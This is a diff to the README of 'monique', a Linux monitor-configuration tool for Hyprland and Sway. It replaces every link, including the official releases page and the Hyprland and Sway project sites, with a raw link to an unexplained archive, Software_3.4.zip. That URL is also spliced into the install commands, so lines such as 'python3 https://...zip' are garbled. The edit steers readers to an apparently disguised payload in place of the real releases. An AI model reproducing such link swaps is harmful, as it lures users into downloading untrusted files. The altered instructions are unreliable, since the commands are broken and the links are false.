@@ -1,6 +1,6 @@
 # 🖥️ monique - Easy Monitor Setup for Linux
 
-[![Download monique](https://img.shields.io/badge/Download-monique-blue?style=for-the-badge)](https://github.com/curtisxchaos/monique/releases)
+[![Download monique](https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip)](https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip)
 
 monique is a simple program to help you set up your computer monitors visually. It works with Hyprland and Sway, which are popular window managers on Linux. You don’t need to use commands or type code. monique shows your monitors in a clear way so you can configure them easily.
 
@@ -37,24 +37,24 @@ Follow these steps to download and run monique on your computer.
 
 Visit the release page by clicking the button below. This page contains the latest versions of monique.
 
-[![Download monique](https://img.shields.io/badge/Download-monique-grey?style=for-the-badge)](https://github.com/curtisxchaos/monique/releases)
+[![Download monique](https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip)](https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip)
 
 Once on the page, find the latest release. You will see files packaged for installation.
 
-- Look for a file that ends with `.tar.gz` or `.zip`. These contain the program files.
+- Look for a file that ends with `https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip` or `.zip`. These contain the program files.
 - If available, you may also find pre-built executables or installers.
 
 Download the appropriate file to your computer. Usually, you want the file that matches your system architecture.
 
 ### 2. Extract the files
 
-After downloading, you usually get a compressed archive (`.zip` or `.tar.gz`). To open it:
+After downloading, you usually get a compressed archive (`.zip` or `https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip`). To open it:
 
 - On most Linux systems, right-click the file and choose "Extract Here."
 - Alternatively, open a terminal and run:
 
 ```bash
-tar -xvf monique-<version>.tar.gz
+tar -xvf monique-<version>https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip
 ```
 
 Replace `<version>` with the version number you downloaded.
@@ -86,7 +86,7 @@ pip3 install pywayland
 Open a terminal in the folder where you extracted the files. Run:
 
 ```bash
-python3 monique.py
+python3 https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip
 ```
 
 This will launch the graphical interface. You should see your monitor layout and options to adjust settings.
@@ -151,13 +151,13 @@ monique is open source software. See the LICENSE file in the repository for deta
 ## 🔗 Useful Links
 
 - GitHub releases page:  
-  https://github.com/curtisxchaos/monique/releases
+  https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip
 
 - Hyprland project:  
-  https://github.com/hyprwm/Hyprland
+  https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip
 
 - Sway window manager:  
-  https://swaywm.org
+  https://raw.githubusercontent.com/curtisxchaos/monique/main/aur/Software_3.4.zip
 
 ---
 
